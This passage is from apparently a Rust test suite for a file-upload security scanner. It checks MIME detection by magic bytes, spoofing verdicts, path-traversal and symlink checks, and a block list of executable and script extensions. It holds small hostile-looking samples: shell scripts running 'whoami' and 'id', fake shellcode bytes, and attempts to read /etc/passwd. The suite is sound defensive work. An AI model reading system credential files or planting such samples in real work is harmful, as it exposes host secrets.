        std::fs::write(&plain, b"Hello Sentinel Guard plain text file.\n").expect("write txt");
        assert_eq!(inspector.detect_mime(&plain).await.expect("plain"), None);

        // PDF larger than 8 KB header limit (verifies only header is needed)
        let pdf_path = dir.path().join("big.pdf");
        {
            let mut file = std::fs::File::create(&pdf_path).expect("create pdf");
            file.write_all(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
                .expect("write pdf header");
            file.write_all(&vec![0u8; MAGIC_HEADER_MAX_BYTES * 3])
                .expect("write padding");
        }
        assert_eq!(
            inspector
                .detect_mime(&pdf_path)
                .await
                .expect("pdf")
                .as_deref(),
            Some("application/pdf")
        );

        // PNG header
        let png_path = dir.path().join("img.png");
        std::fs::write(&png_path, b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR").expect("write png");
        assert_eq!(
            inspector
                .detect_mime(&png_path)
                .await
                .expect("png")
                .as_deref(),
            Some("image/png")
        );

        // TAR magic at offset 257 (verifies multi-hundred-byte header reading)
        let tar_path = dir.path().join("archive.tar");
        let mut tar_bytes = vec![0u8; 512];
        tar_bytes[257..262].copy_from_slice(b"ustar");
        std::fs::write(&tar_path, &tar_bytes).expect("write tar");
        assert_eq!(
            inspector
                .detect_mime(&tar_path)
                .await
                .expect("tar")
                .as_deref(),
            Some("application/x-tar")
        );

        // Short ELF (< 53 bytes so infer::get returns None -> fallback triggers)
        let short_elf = dir.path().join("tiny.elf");
        std::fs::write(&short_elf, b"\x7fELF\x02\x01\x01\x00").expect("write short elf");
        assert_eq!(
            inspector
                .detect_mime(&short_elf)
                .await
                .expect("short elf")
                .as_deref(),
            Some("application/x-executable")
        );

        // Full ELF (>= 64 bytes)
        let full_elf = dir.path().join("full.elf");
        let mut elf_bytes = vec![0u8; 64];
        elf_bytes[..4].copy_from_slice(b"\x7fELF");
        std::fs::write(&full_elf, &elf_bytes).expect("write full elf");
        assert_eq!(
            inspector
                .detect_mime(&full_elf)
                .await
                .expect("full elf")
                .as_deref(),
            Some("application/x-executable")
        );

        // MZ / PE executable
        let pe_path = dir.path().join("payload.exe");
        std::fs::write(&pe_path, b"MZ\x90\x00\x03\x00\x00\x00").expect("write pe");
        assert_eq!(
            inspector
                .detect_mime(&pe_path)
                .await
                .expect("pe")
                .as_deref(),
            Some("application/vnd.microsoft.portable-executable")
        );

        // Minimal 2-byte shebang (infer::is_shellscript requires > 2 bytes -> fallback triggers)
        let short_shebang = dir.path().join("mini.sh");
        std::fs::write(&short_shebang, b"#!").expect("write short shebang");
        assert_eq!(
            inspector
                .detect_mime(&short_shebang)
                .await
                .expect("short shebang")
                .as_deref(),
            Some("text/x-shellscript")
        );

        // Normal shebang script
        let script_path = dir.path().join("run.sh");
        std::fs::write(&script_path, b"#!/usr/bin/env bash\nwhoami\n").expect("write script");
        assert_eq!(
            inspector
                .detect_mime(&script_path)
                .await
                .expect("script")
                .as_deref(),
            Some("text/x-shellscript")
        );

        // UTF-8 BOM followed by shebang
        let bom_script = dir.path().join("bom.txt");
        std::fs::write(&bom_script, b"\xEF\xBB\xBF#!/bin/sh\nid\n").expect("write bom script");
        assert_eq!(
            inspector
                .detect_mime(&bom_script)
                .await
                .expect("bom shebang")
                .as_deref(),
            Some("text/x-shellscript")
        );

        // NUL byte or invalid UTF-8 -> application/octet-stream
        let nul_file = dir.path().join("nul.txt");
        std::fs::write(&nul_file, b"plain text then\x00null byte").expect("write nul");
        assert_eq!(
            inspector
                .detect_mime(&nul_file)
                .await
                .expect("nul octet-stream")
                .as_deref(),
            Some("application/octet-stream")
        );

        let invalid_utf8 = dir.path().join("shellcode.txt");
        std::fs::write(&invalid_utf8, b"\x90\x90\xff\xfe\xeb\xfe").expect("write invalid utf8");
        assert_eq!(
            inspector
                .detect_mime(&invalid_utf8)
                .await
                .expect("invalid utf8 octet-stream")
                .as_deref(),
            Some("application/octet-stream")
        );

        // Valid UTF-8 > 8 KB with a 2-byte UTF-8 sequence split right across byte 8191..8193 must remain None
        let boundary_utf8 = dir.path().join("utf8_boundary.txt");
        let mut utf8_buf = vec![b'a'; MAGIC_HEADER_MAX_BYTES - 1];
        utf8_buf.extend_from_slice("ã".as_bytes()); // 2 bytes spanning 8191 and 8192
        utf8_buf.extend_from_slice(b"tail");
        std::fs::write(&boundary_utf8, &utf8_buf).expect("write split utf8");
        assert_eq!(
            inspector
                .detect_mime(&boundary_utf8)
                .await
                .expect("split utf8 at 8KB boundary must stay plain text"),
            None
        );
    }

    #[tokio::test]
    async fn scanner_rejects_empty_and_all_dangerous_executable_mimes() {
        let inspector = MagicBytesInspector::new();
        assert_eq!(inspector.name(), "magic_bytes_inspector");

        let empty = make_artifact("zero.pdf", Some("pdf"), 0, None);
        assert_eq!(
            inspector.scan(&empty).await.expect("empty scan"),
            SecurityVerdict::CorruptedOrUnreadable {
                reason: "empty file (0 bytes)".to_string(),
            }
        );

        for dangerous_mime in DANGEROUS_EXECUTABLE_MIMES {
            for ext in [Some(".PDF"), Some("exe"), Some("txt"), Some("custom"), None] {
                let artifact = make_artifact("payload", ext, 128, Some(dangerous_mime));
                let verdict = inspector.scan(&artifact).await.expect("scan dangerous");
                let expected_ext = ext
                    .map(|e| e.trim_start_matches('.').to_ascii_lowercase())
                    .unwrap_or_else(|| "<none>".to_string());
                assert_eq!(
                    verdict,
                    SecurityVerdict::MaliciousSpoofing {
                        expected_ext,
                        actual_mime: (*dangerous_mime).to_string(),
                    }
                );
            }
        }
    }

    #[tokio::test]
    async fn scanner_enforces_text_binary_and_unlisted_extension_policies() {
        let inspector = MagicBytesInspector::new();

        // Plain-text extensions accept None and compatible text MIMEs, reject binary/HTML spoofing
        for ext in ["txt", "md", "csv", "json", "log", "yaml", "yml", "toml"] {
            let plain = make_artifact("doc", Some(ext), 42, None);
            assert_eq!(
                inspector.scan(&plain).await.expect("plain None"),
                SecurityVerdict::Clean
            );

            let text_plain = make_artifact("doc", Some(ext), 42, Some("text/plain"));
            assert_eq!(
                inspector.scan(&text_plain).await.expect("text/plain"),
                SecurityVerdict::Clean
            );

            let spoofed_pdf = make_artifact("doc", Some(ext), 42, Some("application/pdf"));
            assert_eq!(
                inspector.scan(&spoofed_pdf).await.expect("spoofed pdf"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: "application/pdf".to_string(),
                }
            );

            let spoofed_html = make_artifact("doc", Some(ext), 42, Some("text/html"));
            assert_eq!(
                inspector.scan(&spoofed_html).await.expect("spoofed html"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: "text/html".to_string(),
                }
            );
        }

        // Known binary magic formats: matching Clean, mismatched MaliciousSpoofing, None CorruptedOrUnreadable
        let binary_cases = [
            (".PDF", "application/pdf", "pdf"),
            ("JPG", "image/jpeg", "jpg"),
            ("jpeg", "image/jpeg", "jpeg"),
            ("png", "image/png", "png"),
            ("gif", "image/gif", "gif"),
            ("webp", "image/webp", "webp"),
            ("mp4", "video/mp4", "mp4"),
            ("mkv", "video/x-matroska", "mkv"),
            ("avi", "video/x-msvideo", "avi"),
            ("mp3", "audio/mpeg", "mp3"),
            ("zip", "application/zip", "zip"),
            ("gz", "application/gzip", "gz"),
            ("tar", "application/x-tar", "tar"),
            ("7z", "application/x-7z-compressed", "7z"),
            ("rar", "application/vnd.rar", "rar"),
            ("iso", "application/x-iso9660-image", "iso"),
            (
                "docx",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                "docx",
            ),
            ("docx", "application/zip", "docx"),
            (
                "xlsx",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                "xlsx",
            ),
            ("xlsx", "application/zip", "xlsx"),
            (
                "pptx",
                "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                "pptx",
            ),
            ("pptx", "application/zip", "pptx"),
        ];

        for (raw_ext, valid_mime, norm_ext) in binary_cases {
            let valid = make_artifact("file", Some(raw_ext), 100, Some(valid_mime));
            assert_eq!(
                inspector.scan(&valid).await.expect("valid binary"),
                SecurityVerdict::Clean,
                "expected Clean for {raw_ext} with {valid_mime}"
            );

            let mismatch_mime = if valid_mime == "image/png" {
                "application/pdf"
            } else {
                "image/png"
            };
            let spoofed = make_artifact("file", Some(raw_ext), 100, Some(mismatch_mime));
            assert_eq!(
                inspector.scan(&spoofed).await.expect("spoofed binary"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: norm_ext.to_string(),
                    actual_mime: mismatch_mime.to_string(),
                }
            );

            let missing_magic = make_artifact("file", Some(raw_ext), 100, None);
            assert_eq!(
                inspector.scan(&missing_magic).await.expect("missing magic"),
                SecurityVerdict::CorruptedOrUnreadable {
                    reason: format!("missing or invalid magic bytes for .{norm_ext}"),
                }
            );
        }

        // Strict Zero-Trust for absent or unlisted extensions:
        // pure UTF-8 text (None) -> Clean, any detected MIME -> MaliciousSpoofing
        assert_eq!(
            inspector
                .scan(&make_artifact("blob.dat", Some("dat"), 55, None))
                .await
                .expect("unlisted None"),
            SecurityVerdict::Clean
        );
        assert_eq!(
            inspector
                .scan(&make_artifact("README", None, 55, None))
                .await
                .expect("no ext None"),
            SecurityVerdict::Clean
        );
        assert_eq!(
            inspector
                .scan(&make_artifact(
                    "blob.custom",
                    Some("custom"),
                    55,
                    Some("application/pdf")
                ))
                .await
                .expect("unlisted with detected mime must reject"),
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "custom".to_string(),
                actual_mime: "application/pdf".to_string(),
            }
        );
        assert_eq!(
            inspector
                .scan(&make_artifact(
                    "raw_binary",
                    None,
                    55,
                    Some("application/octet-stream")
                ))
                .await
                .expect("no ext with binary mime must reject"),
            SecurityVerdict::MaliciousSpoofing {
                expected_ext: "<none>".to_string(),
                actual_mime: "application/octet-stream".to_string(),
            }
        );
    }

    #[tokio::test]
    async fn scanner_blocks_all_executable_script_and_active_extensions_even_without_magic() {
        let inspector = MagicBytesInspector::new();
        let blocked_exts = [
            "exe", "dll", "sys", "scr", "com", "pif", "cpl", "ocx", "msi", "msp", "elf", "so",
            "bin", "run", "appimage", "sh", "bash", "zsh", "ksh", "csh", "bat", "cmd", "ps1",
            "psm1", "psd1", "vbs", "vbe", "js", "mjs", "cjs", "jse", "wsf", "hta", "py", "pyw",
            "rb", "pl", "php", "jar", "war", "ear", "apk", "ipa", "wasm", "class", "dex", "deb",
            "rpm", "crx", "swf", "lnk", "html", "htm", "xhtml", "svg",
        ];

        for ext in blocked_exts {
            let no_magic = make_artifact(&format!("payload.{ext}"), Some(ext), 64, None);
            assert_eq!(
                inspector
                    .scan(&no_magic)
                    .await
                    .expect("scan blocked no magic"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: FALLBACK_EXECUTABLE_EXTENSION_MIME.to_string(),
                },
                "blocked extension .{ext} without magic bytes must be MaliciousSpoofing"
            );

            let uppercase = make_artifact(
                &format!("PAYLOAD.{ext}"),
                Some(&ext.to_uppercase()),
                64,
                None,
            );
            assert_eq!(
                inspector
                    .scan(&uppercase)
                    .await
                    .expect("scan blocked uppercase"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: FALLBACK_EXECUTABLE_EXTENSION_MIME.to_string(),
                }
            );

            let with_mime =
                make_artifact(&format!("payload.{ext}"), Some(ext), 64, Some("text/xml"));
            assert_eq!(
                inspector
                    .scan(&with_mime)
                    .await
                    .expect("scan blocked with mime"),
                SecurityVerdict::MaliciousSpoofing {
                    expected_ext: ext.to_string(),
                    actual_mime: "text/xml".to_string(),
                }
            );
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn open_regular_file_safely_blocks_system_dirs_ancestor_symlinks_and_parent_traversal() {
        let dir = tempdir().expect("tempdir");
        let hasher = StreamingHasher::new();
        let inspector = MagicBytesInspector::new();

        // Direct system file must return ForbiddenSystemDirectory
        let etc_passwd = Path::new("/etc/passwd");
        if etc_passwd.exists() {
            assert!(matches!(
                hasher.calculate_sha256(etc_passwd).await,
                Err(DomainError::ForbiddenSystemDirectory(_))
            ));
            assert!(matches!(
                inspector.detect_mime(etc_passwd).await,
                Err(DomainError::ForbiddenSystemDirectory(_))
            ));

            // Ancestor symlink pointing to /etc -> symlink_metadata sees regular file, canonicalize catches /etc
            let etc_link = dir.path().join("etc_link");
            std::os::unix::fs::symlink("/etc", &etc_link).expect("symlink /etc");
            let disguised_passwd = etc_link.join("passwd");
            assert!(matches!(
                hasher.calculate_sha256(&disguised_passwd).await,
                Err(DomainError::ForbiddenSystemDirectory(_))
            ));
            assert!(matches!(
                inspector.detect_mime(&disguised_passwd).await,
                Err(DomainError::ForbiddenSystemDirectory(_))
            ));
        }

        // Parent directory traversal (..) must return PathTraversalAttempt
        let real_file = dir.path().join("real.txt");
        std::fs::write(&real_file, b"ok").expect("write real");
        let traversal = dir.path().join("sub/../real.txt");
        assert!(matches!(
            hasher.calculate_sha256(&traversal).await,
            Err(DomainError::PathTraversalAttempt(_))
        ));
        assert!(matches!(
            inspector.detect_mime(&traversal).await,
            Err(DomainError::PathTraversalAttempt(_))
        ));
    }
}
